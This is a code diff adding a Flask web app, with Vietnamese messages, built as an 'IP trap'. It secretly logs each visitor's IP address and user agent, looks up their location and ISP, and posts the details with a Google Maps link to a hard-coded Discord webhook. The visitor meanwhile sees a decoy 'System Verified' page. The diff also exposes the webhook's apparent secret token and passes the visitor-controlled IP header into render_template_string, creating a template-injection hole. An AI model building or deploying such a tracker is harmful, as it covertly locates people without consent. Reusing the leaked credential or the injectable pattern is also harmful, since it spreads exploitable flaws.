@@ -1,0 +1,78 @@
+import datetime
+import logging
+import threading
+import requests
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1569681912589590538/aoZZYGIYW-Tq4yHSuyomai0YU9Hc_XnPrNGCAF5NAn5N13t_y14rnQRkmFr4fFtpomrX"
+
+def get_geolocation(ip):
+    if ip in ("127.0.0.1", "::1", "localhost"):
+        return {"country": "Localhost", "city": "Local Network", "isp": "Local Machine", "lat": 0.0, "lon": 0.0}
+    try:
+        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,lat,lon", timeout=3)
+        data = response.json()
+        if data.get("status") == "success":
+            return data
+    except Exception as e:
+        logging.error(f"[!] Lỗi Geo-IP: {e}")
+    return {"country": "Unknown", "city": "Unknown", "isp": "Unknown", "lat": 0.0, "lon": 0.0}
+
+def send_to_discord(ip, user_agent, timestamp, geo):
+    try:
+        embed = {
+            "title": "🚨 AXIOM IP TRAP - TÓM GỌN MỤC TIÊU! 🚨",
+            "color": 16711680,
+            "fields": [
+                {"name": "⏱️ Thời gian", "value": f"`{timestamp}`", "inline": False},
+                {"name": "🌐 Địa chỉ IP", "value": f"`{ip}`", "inline": True},
+                {"name": "🌍 Quốc gia / Thành phố", "value": f"`{geo.get('country')} - {geo.get('city')}`", "inline": False},
+                {"name": "📡 Nhà mạng (ISP)", "value": f"`{geo.get('isp')}`", "inline": False},
+                {"name": "🗺️ Bản đồ Google Maps", "value": f"[Mở định vị](https://www.google.com/maps/search/?api=1&query={geo.get('lat')},{geo.get('lon')})", "inline": False},
+                {"name": "💻 User-Agent", "value": f"```text\n{user_agent}\n```", "inline": False}
+            ]
+        }
+        requests.post(DISCORD_WEBHOOK_URL, json={"embeds": [embed]}, timeout=5)
+    except Exception as e:
+        logging.error(f"[!] Lỗi gửi Webhook Discord: {e}")
+
+@app.route('/')
+def trap_route():
+    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if client_ip and ',' in client_ip:
+        client_ip = client_ip.split(',')[0].strip()
+        
+    user_agent = request.headers.get('User-Agent', 'Unknown')
+    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    
+    logging.info(f"[!] TÓM GỌN! IP: {client_ip}")
+    
+    def background_task():
+        geo_data = get_geolocation(client_ip)
+        send_to_discord(client_ip, user_agent, timestamp, geo_data)
+
+    threading.Thread(target=background_task, daemon=True).start()
+
+    html_payload = f"""
+    <!DOCTYPE html>
+    <html lang="vi">
+    <head>
+        <meta charset="UTF-8">
+        <title>System Verified</title>
+    </head>
+    <body style="background: #09090b; color: #22c55e; font-family: 'Courier New', monospace; text-align: center; padding-top: 120px;">
+        <h1 style="font-size: 3em; text-shadow: 0 0 15px #22c55e;">SYSTEM SECURED</h1>
+        <p style="font-size: 1.2em; color: #a1a1aa;">Thiết bị của bạn đã vượt qua kiểm tra an ninh.</p>
+        <h2 style="color: #f43f5e; font-size: 2em;">IP: {client_ip}</h2>
+        <p style="color: #71717a; margin-top: 30px;">Trò chơi kết thúc rồi đấy boss man!</p>
+    </body>
+    </html>
+    """
+    return render_template_string(html_payload)
+
+if __name__ == '__main__':
+    print("[*] Axiom IP Trap đang trực chiến trên cổng 80...")
+    app.run(host='0.0.0.0', port=80)
